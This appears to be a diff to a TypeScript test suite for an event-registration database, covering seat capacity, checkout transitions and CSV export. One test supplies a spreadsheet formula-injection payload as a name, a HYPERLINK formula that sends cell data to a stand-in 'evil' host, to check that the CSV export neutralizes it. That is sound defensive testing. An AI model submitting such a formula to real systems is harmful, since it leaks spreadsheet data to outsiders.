@@ -34,6 +34,10 @@ import {
 } from '../../src/lib/regDb';
 
 const DAY = 24 * 60 * 60 * 1000;
+
+/** createRegistration returning the id, with the waitlist off (a full event is event_full). */
+const createId = async (d: AppDb, input: Parameters<typeof createRegistration>[1]) =>
+  (await createRegistration(d, { allowWaitlist: false, ...input })).id;
 /** A UTC 'YYYY-MM-DD HH:MM:SS' timestamp `offsetMs` from now (matches datetime('now')). */
 const ts = (offsetMs: number) => new Date(Date.now() + offsetMs).toISOString().slice(0, 19).replace('T', ' ');
 
@@ -87,10 +91,10 @@ describe.skipIf(!hasPg)('regDb (Postgres)', () => {
   });
 
   // ── Capacity counting + backstop ─────────────────────────────────────────────
-  it('capacity: pending holds a seat, overflow → event_full (row compensated), cancel frees a seat', async () => {
+  it('capacity: pending holds a seat, overflow → event_full (nothing inserted), cancel frees a seat', async () => {
     const ev = await openEvent({ title_en: 'Capped', title_zh: '限额', capacity: 2 });
     const mk = (name: string, status: 'pending' | 'confirmed') =>
-      createRegistration(db, { eventId: ev, personId: null, name, email: `${name}@x.com`, status, amountCents: 0, currency: 'usd', answers: [] });
+      createId(db, { eventId: ev, personId: null, name, email: `${name}@x.com`, status, amountCents: 0, currency: 'usd', answers: [] });
 
     const r1 = await mk('A', 'pending');
     let e = (await getOpenEvent(db, 'en', ev))!;
@@ -102,7 +106,7 @@ describe.skipIf(!hasPg)('regDb (Postgres)', () => {
     expect(e.taken_count).toBe(2);
     expect(e.confirmed_count).toBe(1);
 
-    // Third exceeds capacity → throw + compensating cancel (seat count stays 2).
+    // Third exceeds capacity → throw and no row is written (seat count stays 2).
     await expect(mk('C', 'pending')).rejects.toThrow('event_full');
     expect((await getOpenEvent(db, 'en', ev))!.taken_count).toBe(2);
 
@@ -117,7 +121,7 @@ describe.skipIf(!hasPg)('regDb (Postgres)', () => {
   it('a pending row older than one hour permanently holds its seat until a guarded terminal transition', async () => {
     const ev = await openEvent({ title_en: 'Stale', title_zh: '过期', capacity: 2 });
     const mk = (name: string, status: 'pending' | 'confirmed') =>
-      createRegistration(db, { eventId: ev, personId: null, name, email: `${name}@x.com`, status, amountCents: 0, currency: 'usd', answers: [] });
+      createId(db, { eventId: ev, personId: null, name, email: `${name}@x.com`, status, amountCents: 0, currency: 'usd', answers: [] });
 
     const stale = await mk('Stale', 'pending');
     // Simulate an ambiguous create whose local attachment never committed. Age
@@ -173,7 +177,7 @@ describe.skipIf(!hasPg)('regDb (Postgres)', () => {
   it('confirmBySession / cancelBySession are idempotent pending→X transitions', async () => {
     const ev = await openEvent();
     const mk = (name: string) =>
-      createRegistration(db, { eventId: ev, personId: null, name, email: `${name}@x.com`, status: 'pending', amountCents: 0, currency: 'usd', answers: [] });
+      createId(db, { eventId: ev, personId: null, name, email: `${name}@x.com`, status: 'pending', amountCents: 0, currency: 'usd', answers: [] });
 
     const r1 = await mk('conf');
     await attachCheckoutSession(db, r1, 'cs_conf');
@@ -192,7 +196,7 @@ describe.skipIf(!hasPg)('regDb (Postgres)', () => {
 
   it('guarded Checkout transition accepts only pending exact amount/currency and null-or-same session', async () => {
     const ev = await openEvent();
-    const make = async (name: string, amountCents = 2500, currency = 'usd') => createRegistration(db, {
+    const make = async (name: string, amountCents = 2500, currency = 'usd') => createId(db, {
       eventId: ev, personId: null, name, email: `${name}@x.com`, status: 'pending', amountCents, currency, answers: [],
     });
     const request = async (requestId: string, registrationId: number) => {
@@ -234,7 +238,7 @@ describe.skipIf(!hasPg)('regDb (Postgres)', () => {
 
   it('guarded cancellation never changes a confirmed registration', async () => {
     const ev = await openEvent();
-    const reg = await createRegistration(db, {
+    const reg = await createId(db, {
       eventId: ev, personId: null, name: 'confirmed-guard', email: 'confirmed-guard@x.com',
       status: 'confirmed', amountCents: 2500, currency: 'usd', answers: [],
     });
@@ -248,7 +252,7 @@ describe.skipIf(!hasPg)('regDb (Postgres)', () => {
 
   it('checkpoints the registration write and private cleanup independently, then replay converges cleanup', async () => {
     const ev = await openEvent();
-    const reg = await createRegistration(db, {
+    const reg = await createId(db, {
       eventId: ev, personId: null, name: 'lease-guard', email: 'lease-guard@x.com',
       status: 'pending', amountCents: 4200, currency: 'usd', answers: [],
     });
@@ -298,7 +302,7 @@ describe.skipIf(!hasPg)('regDb (Postgres)', () => {
     expect((await listQuestions(db, 'zh', ev)).map((x) => x.label)).toEqual(['名', '尺码']);
 
     const answers = validateAnswers(qs, { [String(qs[0].id)]: 'Bob', [String(qs[1].id)]: 'M' });
-    const reg = await createRegistration(db, {
+    const reg = await createId(db, {
       eventId: ev, personId: null, name: 'Bob', email: 'bob@x.com', status: 'confirmed', amountCents: 0, currency: 'usd', answers,
     });
 
@@ -325,7 +329,7 @@ describe.skipIf(!hasPg)('regDb (Postgres)', () => {
       starts_at: ts(2 * DAY), capacity: 30, price_cents: 2500, active: 1,
     });
     // A registration so the counts are non-zero.
-    await createRegistration(db, {
+    await createId(db, {
       eventId: ev, personId: null, name: 'A', email: 'a@x.com', status: 'confirmed', amountCents: 2500, currency: 'usd', answers: [],
     });
 
@@ -403,18 +407,18 @@ describe.skipIf(!hasPg)('regDb (Postgres)', () => {
     const qs = await listQuestions(db, 'en', ev);
     const tricky = 'Smith, "Bob"'; // comma + embedded quotes
     const ans = validateAnswers(qs, { [String(qs[0].id)]: tricky });
-    await createRegistration(db, {
+    await createId(db, {
       eventId: ev, personId: null, name: 'First Reg', email: 'f@x.com', status: 'confirmed', amountCents: 1500, currency: 'usd', answers: ans,
     });
-    await createRegistration(db, {
+    await createId(db, {
       eventId: ev, personId: null, name: 'Second Reg', email: 's@x.com', status: 'pending', amountCents: 0, currency: 'usd', answers: [],
     });
 
     const csv = await registrationsCsv(db, 'en', ev);
     const lines = csv.split('\r\n');
-    expect(lines[0]).toBe('Name,Email,Status,Amount,Registered,Comment');
-    expect(lines[1].startsWith('Second Reg,')).toBe(true); // newest first (id tiebreak)
-    expect(lines[2].startsWith('First Reg,')).toBe(true);
+    expect(lines[0]).toBe('Confirmation,Name,Email,Status,Party size,Amount,Registered,Comment');
+    expect(lines[1]).toMatch(/^R\d\d-0002,Second Reg,/); // newest first (id tiebreak)
+    expect(lines[2]).toMatch(/^R\d\d-0001,First Reg,/);
     expect(lines[2]).toContain('15.00'); // integer cents → dollars
     expect(csv).toContain('"Smith, ""Bob"""'); // quoted, embedded quotes doubled
 
@@ -428,7 +432,7 @@ describe.skipIf(!hasPg)('regDb (Postgres)', () => {
   it('registrationsCsv neutralizes spreadsheet formula injection from anonymous fields', async () => {
     const ev = await openEvent();
     // A visitor could submit a formula as their name via the anonymous submit path.
-    await createRegistration(db, {
+    await createId(db, {
       eventId: ev, personId: null, name: '=HYPERLINK("http://evil/?"&A1,"x")', email: 'e@x.com',
       status: 'confirmed', amountCents: 0, currency: 'usd', answers: [],
     });
